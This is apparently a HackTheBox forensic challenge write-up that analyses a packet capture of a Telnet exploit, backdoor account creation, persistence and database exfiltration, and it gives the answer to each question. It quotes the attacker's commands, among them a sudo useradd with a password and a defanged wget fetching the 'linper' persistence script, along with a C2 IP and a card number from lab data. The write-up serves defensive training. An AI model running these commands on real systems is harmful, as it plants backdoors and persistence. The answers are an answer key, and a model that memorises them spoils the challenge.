# Telly – Network Telemetry Investigation of Suspected Data Exfiltration

---

## HackTheBox

## Scenario

As a Junior DFIR Analyst at an MSSP, you are assigned to investigate suspicious network telemetry from a backup server. A Data Loss Prevention (DLP) solution flagged potential data exfiltration activity originating from the server. Although the IT team reports the system is lightly used and primarily stores backups, unusual outbound traffic patterns suggest possible compromise. The objective is to analyze network logs, validate the alert, identify exfiltration behavior, and determine the scope of impact.

## Alert

DLP Alert: Unusual outbound data transfer detected from backup server to an external IP address.

High-volume data transmission outside normal operational hours, potentially indicating unauthorized data exfiltration.

## Tools Used

- WireShark

## Given Files

```jsx
6804 -rw-r--r-- 1 root root 6966796 Jan 27 10:59 monitoringservice_export_202610AM-11AM.pcapng
```

## Challenge Questions

1.What CVE is associated with the vulnerability exploited in the Telnet protocol?

Filtering only telnet packet

```jsx
52	2026-01-27 10:39:28.319357980	192.168.72.131	192.168.72.136	TELNET	153	Telnet Data ...
```

On the packet 54 the attacker executed the commands

```jsx
sudo useradd -m -s /bin/bash cleanupsvc; echo "cleanupsvc:YouKnowWhoiam69" 
| sudo chpasswd.
```

- Added a user : cleanupsvc
- set password : YouKnowWhoiam69

<img width="1290" height="833" alt="image" src="https://github.com/user-attachments/assets/3c3dd7d8-9624-4e22-a267-6e60af0b03be" />

In google searching for the CVE for this exploit.

<img width="1459" height="827" alt="image" src="https://github.com/user-attachments/assets/b72e898f-1b74-4f2f-85a6-131b04bcfbf5" />

Answer: CVE-2026-24061

---

2. When was the Telnet vulnerability successfully exploited, granting the attacker remote root access on the target machine?

```jsx
52	2026-01-27 10:39:28.319357980	192.168.72.131	192.168.72.136	TELNET	153	Telnet Data ...
```

The attacker started exploiting the backup server on “2026-01-27 10:39:28”

Answer: 2026-01-27 10:39:28

---

3.What is the hostname of the targeted server?

On packet

```jsx
52	2026-01-27 10:39:28.319357980	192.168.72.131	192.168.72.136	TELNET	153	Telnet Data ...
```

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/96539ec2-eece-454b-86fa-f44f0282d991" />

Answer: backup-secondary

---

4.The attacker created a backdoor account to maintain future access. What username and password were set for that account?

On the packet 

```jsx
52	2026-01-27 10:39:28.319357980	192.168.72.131	192.168.72.136	TELNET	153	Telnet Data ...
```

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/bea5d473-697e-4092-a506-4818890ed555" />

- Added a user : cleanupsvc
- set password : YouKnowWhoiam69
- Gives it login shell : /bin/bash

Answer: cleanupsvc:YouKnowWhoiam69

---

5.What was the full command the attacker used to download the persistence script?

On the packet

```jsx
52	2026-01-27 10:39:28.319357980	192.168.72.131	192.168.72.136	TELNET	153	Telnet Data ...
```

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/a08be581-60ad-4655-a479-9342fad5848e" />

linper is not a standard, widely recognized system tool, but rather a naming convention typically used for Linux Persistence scripts. These scripts, often used by red teams or threat actors, are designed to maintain unauthorized access to a Linux system across reboots, credential changes, or other system interruptions.

Answer: wget hxxps[://]raw[.]githubusercontent[.]com/montysecurity/linper/refs/heads/main/linper[.]sh

---

6.The attacker installed remote access persistence using the persistence script. What is the C2 IP address?

On the packet

```jsx
52	2026-01-27 10:39:28.319357980	192.168.72.131	192.168.72.136	TELNET	153	Telnet Data ...
```

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/6d71fd61-2225-47da-b00e-063e8b15c5fe" />

Where the attacker gave execute permission to the persistence file downloaded linper.sh

Add the IP address “91.99.25.54” to C2 command control.

OSINT on the IP “91.99.25.54” In virusTotal

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/63a3436f-3da1-4388-995d-c8fe66a8fd8f" />

Its a Evasion and Persistence via Hidden Hyper-V Virtual Machines

Answer: 91.99.25.54

---

7.The attacker exfiltrated a sensitive database file. At what time was this file exfiltrated?

```jsx
62	2026-01-27 10:39:28.616577034	192.168.72.136	192.168.72.131	TELNET	1067	Telnet Data ...
```

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/8f3d0f29-469b-477d-81d5-d49625352e63" />

The attacker started the python HTTP server to exfiltrate the files.

Answer: 2026-01-27 10:49:54 

---

8.Analyze the exfiltrated database. To follow compliance requirements, the breached organization needs to notify its customers. For data validation purposes, find the credit card number for a customer named Quinn Harris.

On the packet 

```jsx
9380	2026-01-27 10:49:54.377343378	192.168.72.136	192.168.72.131	HTTP	5114	HTTP/1.0 200 OK 
```

The file was downloaded in Sqllite database.

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/0a44e3f8-3440-444e-82ab-31c51e9915bc" />

So downloaded the credit-cards-25-blackfriday.db

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/a4e6292b-34b3-4e66-97be-69dd78382833" />

The username : Quinn Harris, Searched in the data base.

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/0ef8644b-e123-48c2-93f1-83ef7d49f932" />

Answer: 5312269047781209

---

<img width="1262" height="812" alt="image" src="https://github.com/user-attachments/assets/13bdd271-5113-439f-b683-2ed1a1868a85" />

# MITRE ATT&CK Mapping

| ATT&CK Stage | Technique ID | Technique |
| --- | --- | --- |
| Reconnaissance | - | - |
| Resource Development | - | - |
| Initial Access | T1190 | Exploit Public-Facing Application |
| Execution | T1059.004 | Command and Scripting Interpreter: Unix Shell |
| Persistence | T1136.001 | Create Account: Local Account |
| Privilege Escalation | T1078 | Valid Accounts |
| Defense Impairment | - | - |
| Credential Access | - | - |
| Discovery | T1082 | System Information Discovery |
| Lateral Movement | - | - |
| Collection | T1005 | Data from Local System |
| Command and Control | T1105 | Ingress Tool Transfer |
| Exfiltration | T1048 | Exfiltration Over Alternative Protocol |
| Impact | - | - |

### DONE BY

#### RUTHRAN-SEC
